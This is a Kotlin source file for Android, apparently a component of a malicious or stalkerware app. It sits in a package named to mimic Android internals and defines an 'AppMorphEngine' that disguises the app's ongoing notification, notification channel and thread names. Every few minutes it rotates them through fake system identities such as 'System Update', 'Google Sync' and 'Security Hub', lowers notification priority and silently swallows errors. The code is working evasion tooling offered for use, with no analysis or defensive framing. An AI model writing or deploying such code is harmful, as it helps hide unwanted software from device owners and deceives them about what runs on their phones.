package com.android.internal.os.morph

import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import kotlin.random.Random

data class AppIdentity(
    val label: String,
    val channelName: String,
    val channelDesc: String,
    val notificationText: String
)

class AppMorphEngine private constructor() {

    private var context: Context? = null
    private var running = false
    private var currentIdentityIndex = 0
    private var morphCount = 0

    private val identities = listOf(
        AppIdentity("System Update", "System Service", "OS maintenance", "Updating system..."),
        AppIdentity("WiFi Service", "Connectivity", "Network optimization", "Managing connections..."),
        AppIdentity("Battery Stats", "Power", "Battery monitoring", "Tracking usage..."),
        AppIdentity("Device Care", "Maintenance", "Device optimization", "Optimizing..."),
        AppIdentity("Security Hub", "Security", "Platform security", "Security check..."),
        AppIdentity("Network Config", "Network", "Network settings", "Configuring network..."),
        AppIdentity("System Interface", "System UI", "System resources", "Loading resources..."),
        AppIdentity("Google Sync", "Accounts", "Account sync", "Syncing data..."),
        AppIdentity("Carrier Setup", "Carrier", "Carrier config", "Configuring carrier..."),
        AppIdentity("Media Ops", "Storage", "Media processing", "Processing media..."),
        AppIdentity("App Manager", "Apps", "App management", "Managing apps..."),
        AppIdentity("Download Queue", "Transfers", "File transfer", "Downloading..."),
        AppIdentity("Bluetooth Stack", "Bluetooth", "Bluetooth service", "Bluetooth active..."),
        AppIdentity("Cloud Storage", "Cloud", "Cloud services", "Syncing cloud..."),
        AppIdentity("Health Monitor", "Device Health", "Health tracking", "Checking health..."),
    )

    private val baseChannelId = "core_service"

    fun init(ctx: Context) {
        context = ctx
    }

    fun startMorphCycle(intervalMs: Long = 300000) {
        if (running) return
        running = true

        Thread({
            while (running) {
                try {
                    Thread.sleep(intervalMs)
                    morphIdentity()
                } catch (_: Exception) { break }
            }
        }, "bg-morph-worker").apply { isDaemon = true; start() }
    }

    fun stopMorphCycle() {
        running = false
    }

    fun morphNow(): AppIdentity {
        return morphIdentity()
    }

    private fun morphIdentity(): AppIdentity {
        val ctx = context ?: return identities[0]
        currentIdentityIndex = (currentIdentityIndex + 1) % identities.size
        val identity = identities[currentIdentityIndex]
        morphCount++

        try {
            recreateChannel(ctx, identity)
            updatePersistentNotification(ctx, identity)
            changeProcessName(ctx, identity)
            randomizeNotificationPriority(ctx)
        } catch (_: Exception) {}

        return identity
    }

    private fun recreateChannel(ctx: Context, identity: AppIdentity) {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.deleteNotificationChannel(baseChannelId)
        val importance = when (Random.nextInt(3)) {
            0 -> NotificationManager.IMPORTANCE_LOW
            1 -> NotificationManager.IMPORTANCE_MIN
            else -> NotificationManager.IMPORTANCE_DEFAULT
        }
        val channel = NotificationChannel(baseChannelId, identity.channelName, importance).apply {
            description = identity.channelDesc
            setShowBadge(false)
            enableVibration(false)
            lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        }
        nm.createNotificationChannel(channel)
    }

    private fun updatePersistentNotification(ctx: Context, identity: AppIdentity) {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notifId = 0xDEAD
        try {
            for (notif in nm.activeNotifications) {
                if (notif.id == notifId) {
                    nm.cancel(notif.tag, notifId)
                }
            }
        } catch (_: Exception) {}

        try {
            val icon = ctx.applicationInfo.icon
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(ctx, baseChannelId)
            } else {
                Notification.Builder(ctx)
            }
            val notif = builder
                .setContentTitle(identity.label)
                .setContentText(identity.notificationText)
                .setSmallIcon(if (icon != 0) icon else android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setShowWhen(true)
                .build()
            nm.notify("core_svc", notifId, notif)
        } catch (_: Exception) {}
    }

    private fun changeProcessName(ctx: Context, identity: AppIdentity) {
        try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            for (proc in am.runningAppProcesses) {
                if (proc.processName.contains(ctx.packageName)) {
                    Thread.currentThread().name = "bg-${identity.label.lowercase().replace(" ", "-")}"
                    break
                }
            }
        } catch (_: Exception) {}
        Thread({
            while (running) {
                try { Thread.sleep(60000) } catch (_: Exception) { break }
            }
        }, "bg-daemon").apply { isDaemon = true; start() }
    }

    private fun randomizeNotificationPriority(ctx: Context) {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        try {
            val importance = when (Random.nextInt(3)) {
                0 -> NotificationManager.IMPORTANCE_LOW
                1 -> NotificationManager.IMPORTANCE_MIN
                else -> NotificationManager.IMPORTANCE_DEFAULT
            }
            val channel = NotificationChannel(baseChannelId, "svc", importance).apply {
                setShowBadge(false)
                enableVibration(false)
            }
            nm.createNotificationChannel(channel)
        } catch (_: Exception) {}
    }

    fun getCurrentIdentity(): AppIdentity = identities[currentIdentityIndex]

    fun getMorphCount(): Int = morphCount

    fun getReport(): String {
        return """=== Morph ===
Count: $morphCount
Identity: ${identities[currentIdentityIndex].label}
Cycle: $running"""
    }

    companion object {
        @Volatile private var instance: AppMorphEngine? = null
        fun getInstance(): AppMorphEngine {
            return instance ?: synchronized(this) {
                instance ?: AppMorphEngine().also { instance = it }
            }
        }
    }
}
